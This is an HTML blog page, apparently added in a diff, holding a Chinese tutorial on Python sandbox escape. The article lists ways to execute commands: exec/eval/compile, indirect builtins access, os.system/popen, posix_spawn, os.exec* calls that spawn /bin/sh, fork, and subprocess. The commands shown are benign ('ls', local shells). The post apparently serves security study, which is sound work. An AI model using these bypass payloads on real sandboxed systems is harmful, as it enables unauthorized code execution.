@@ -1,0 +1,2005 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="sky123">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://skyi23.github.io/2025/08/12/python 沙箱逃逸/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/null" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/null">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/null">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Python 沙箱逃逸 | sky123&#39;s site
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                sky123&#39;s site
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-solid fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    标签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/bookmarks/"
+                                        >
+                                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                                    书签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/bookmarks/"
+                        >
+                            <span>
+                                书签
+                            </span>
+                            
+                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">15</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">47</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Python 沙箱逃逸</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/icon.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-08-12 00:01:08</span>
+        <span class="mobile">2025-08-12 00:01:08</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-12 00:01:06</span>
+            <span class="mobile">2025-08-12 00:01:06</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/web/">web</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/web/python-web/">python web</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/python-web/">python web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>8.5k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>37 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="逃逸目标"><a href="#逃逸目标" class="headerlink" title="逃逸目标"></a>逃逸目标</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="builtin-模块"><a href="#builtin-模块" class="headerlink" title="builtin 模块"></a>builtin 模块</h3><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>多行支持</th>
+<th>返回值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>exec(code)</code></td>
+<td>✅</td>
+<td><code>None</code></td>
+</tr>
+<tr>
+<td><code>eval(expr)</code></td>
+<td>❌</td>
+<td>计算结果</td>
+</tr>
+<tr>
+<td><code>eval(compile(code,&quot;exec&quot;))</code></td>
+<td>✅</td>
+<td><code>None</code></td>
+</tr>
+</tbody></table>
+<h4 id="exec（执行-Python-代码字符串）"><a href="#exec（执行-Python-代码字符串）" class="headerlink" title="exec（执行 Python 代码字符串）"></a><code>exec</code>（执行 Python 代码字符串）</h4><p>支持多行代码，执行结果是 <code>None</code>（无返回值），运行环境默认是当前全局&#x2F;局部作用域。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>也可以通过 <code>builtins</code> 模块间接调用：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.<span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>.__self__.<span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="eval（求值表达式）"><a href="#eval（求值表达式）" class="headerlink" title="eval（求值表达式）"></a><code>eval</code>（求值表达式）</h4><p>只能执行<strong>单个表达式</strong>（不能直接多行、不能直接赋值语句等）,返回表达式计算结果。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p><code>eval</code> 无法直接达到执行多行代码的效果，使用 <code>compile</code> 函数并传入 <code>exec</code> 模式就能够实现。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">compile</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>))</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>Python 内置函数 <code>compile(source, filename, mode)</code> 会把 <strong>源码字符串</strong> 编译成 <strong>可执行的代码对象（code object）</strong>。</p>
+<ul>
+<li><strong><code>source</code></strong> ：要编译的 Python 代码（字符串、AST 等）</li>
+<li><strong><code>filename</code></strong> ：代码来源名字（给调试器&#x2F;异常信息用，随便写，比如 <code>&lt;string&gt;</code>、<code>&lt;payload&gt;</code>）</li>
+<li><strong><code>mode</code></strong> ：<ul>
+<li><code>&#39;exec&#39;</code> → 执行模式，可包含多行语句（<code>for</code>、<code>def</code>、<code>import</code> 等）</li>
+<li><code>&#39;eval&#39;</code> → 表达式模式，只允许单个表达式</li>
+<li><code>&#39;single&#39;</code> → 单行模式，交互式执行（会回显）</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h3 id="os-模块"><a href="#os-模块" class="headerlink" title="os 模块"></a>os 模块</h3><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>是否走 Shell</th>
+<th>是否返回结果</th>
+<th>是否替换当前进程</th>
+<th>是否可传环境变量</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>os.system</code></td>
+<td>✅</td>
+<td>❌（返回码）</td>
+<td>❌</td>
+<td>间接（依赖 shell）</td>
+</tr>
+<tr>
+<td><code>os.popen</code></td>
+<td>✅</td>
+<td>✅（输出）</td>
+<td>❌</td>
+<td>间接（依赖 shell）</td>
+</tr>
+<tr>
+<td><code>posix_spawn</code></td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td><code>spawnv</code></td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td><code>exec*</code> 系列</td>
+<td>❌&#x2F;PATH 可选</td>
+<td>❌</td>
+<td>✅</td>
+<td>部分支持（带 e 的）</td>
+</tr>
+<tr>
+<td><code>fork</code>+cmd</td>
+<td>可选</td>
+<td>可选</td>
+<td>❌</td>
+<td>可选</td>
+</tr>
+</tbody></table>
+<h4 id="system-popen-系列（最直观）"><a href="#system-popen-系列（最直观）" class="headerlink" title="system &#x2F; popen 系列（最直观）"></a><code>system</code> &#x2F; <code>popen</code> 系列（最直观）</h4><p>直接通过 shell 执行命令，结果返回码或输出内容。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;ls&#x27;</span>)                                <span class="comment"># 执行命令，返回 exit code</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)                  <span class="comment"># 动态导入绕过</span></span><br><span class="line"></span><br><span class="line">os.popen(<span class="string">&quot;ls&quot;</span>).read()                           <span class="comment"># 执行命令并读取输出</span></span><br></pre></td></tr></table></figure></div>
+
+<p>⚠️ <code>system</code> 会启动一个 shell（sh&#x2F;bash），<code>popen</code> 还能直接捕获输出。</p>
+<h4 id="spawn-posix-spawn-系列（直接运行可执行文件）"><a href="#spawn-posix-spawn-系列（直接运行可执行文件）" class="headerlink" title="spawn &#x2F; posix_spawn 系列（直接运行可执行文件）"></a><code>spawn</code> &#x2F; <code>posix_spawn</code> 系列（直接运行可执行文件）</h4><p>直接执行可执行文件，可传参数和环境变量，依赖 <code>execve</code>。不走 shell，直接运行二进制。常用于不想依赖 shell 解析的场景（绕过某些字符过滤）。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">os.posix_spawn(<span class="string">&quot;/bin/ls&quot;</span>, [<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;-l&quot;</span>], os.environ)</span><br><span class="line">os.posix_spawn(<span class="string">&quot;/bin/bash&quot;</span>, [<span class="string">&quot;/bin/bash&quot;</span>], os.environ)</span><br><span class="line"></span><br><span class="line">os.spawnv(<span class="number">0</span>, <span class="string">&quot;/bin/ls&quot;</span>, [<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;-l&quot;</span>])</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>posix_spawn</code> → <strong>只有类 Unix 系统</strong>可用，Windows 会直接 <code>AttributeError</code>。</li>
+<li><code>spawnv</code> → Windows 和类 Unix 都能用，但执行行为会跟平台相关。</li>
+</ul>
+<h4 id="exec-系列（替换当前进程）"><a href="#exec-系列（替换当前进程）" class="headerlink" title="exec* 系列（替换当前进程）"></a><code>exec*</code> 系列（替换当前进程）</h4><p>直接替换当前 Python 进程为目标程序（执行后 Python 不会返回）。</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>路径方式</th>
+<th>传参方式</th>
+<th>环境变量指定</th>
+<th>PATH 搜索</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>execl</code></td>
+<td>绝对路径</td>
+<td>分散参数</td>
+<td>❌</td>
+<td>❌</td>
+</tr>
+<tr>
+<td><code>execle</code></td>
+<td>绝对路径</td>
+<td>分散参数</td>
+<td>✅</td>
+<td>❌</td>
+</tr>
+<tr>
+<td><code>execlp</code></td>
+<td>程序名</td>
+<td>分散参数</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td><code>execlpe</code></td>
+<td>程序名</td>
+<td>分散参数</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td><code>execv</code></td>
+<td>绝对路径</td>
+<td>列表参数</td>
+<td>❌</td>
+<td>❌</td>
+</tr>
+<tr>
+<td><code>execve</code></td>
+<td>绝对路径</td>
+<td>列表参数</td>
+<td>✅</td>
+<td>❌</td>
+</tr>
+<tr>
+<td><code>execvp</code></td>
+<td>程序名</td>
+<td>列表参数</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td><code>execvpe</code></td>
+<td>程序名</td>
+<td>列表参数</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+</tbody></table>
+<p>例子：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.execl(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>)                      <span class="comment"># 最简单 exec</span></span><br><span class="line">os.execve(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;sh&#x27;</span>], os.environ)       <span class="comment"># 列表 + 环境</span></span><br><span class="line">os.execlp(<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>)                           <span class="comment"># 搜索 PATH</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execvpe(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;sh&#x27;</span>], <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br></pre></td></tr></table></figure></div>
+
+<p>特点：</p>
+<ul>
+<li>进程替换，没有返回值（当前 Python 进程终止）。</li>
+<li>适合提权后直接切 shell。</li>
+</ul>
+<h4 id="fork-命令执行（子进程运行）"><a href="#fork-命令执行（子进程运行）" class="headerlink" title="fork + 命令执行（子进程运行）"></a><code>fork</code> + 命令执行（子进程运行）</h4><p>手动 fork 出一个子进程执行命令。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).fork() == <span class="number">0</span>) <span class="keyword">and</span> <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>父进程继续运行，子进程执行命令。</li>
+<li>常配合 exec 系列实现并行。</li>
+</ul>
+<h3 id="subprocess-模块"><a href="#subprocess-模块" class="headerlink" title="subprocess 模块"></a>subprocess 模块</h3><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>Python 版本</th>
+<th>返回值类型 &#x2F; 内容</th>
+<th>失败处理</th>
+<th>获取输出方式</th>
+<th>是否走 shell</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Popen</code></td>
+<td>py2 &#x2F; py3</td>
+<td><code>Popen</code> 对象</td>
+<td>无</td>
+<td>❌（需 <code>stdout=PIPE</code> 后 <code>.stdout.read()</code>）</td>
+<td>默认否，可选</td>
+</tr>
+<tr>
+<td><code>call</code></td>
+<td>py2 &#x2F; py3</td>
+<td><code>int</code>（exit code）</td>
+<td>无</td>
+<td>❌</td>
+<td>默认否，可选</td>
+</tr>
+<tr>
+<td><code>check_call</code></td>
+<td>py2 &#x2F; py3</td>
+<td><code>int</code>（exit code）</td>
+<td>错误抛异常</td>
+<td>❌</td>
+<td>默认否，可选</td>
+</tr>
+<tr>
+<td><code>check_output</code></td>
+<td>py2 &#x2F; py3</td>
+<td><code>bytes</code>（命令输出）</td>
+<td>错误抛异常</td>
+<td>✅（直接返回 stdout）</td>
+<td>默认否，可选</td>
+</tr>
+<tr>
+<td><code>run</code></td>
+<td>py3</td>
+<td><code>CompletedProcess</code> 对象</td>
+<td>可选抛异常</td>
+<td>✅（需 <code>capture_output=True</code> 或 <code>stdout=PIPE</code>）</td>
+<td>默认否，可选</td>
+</tr>
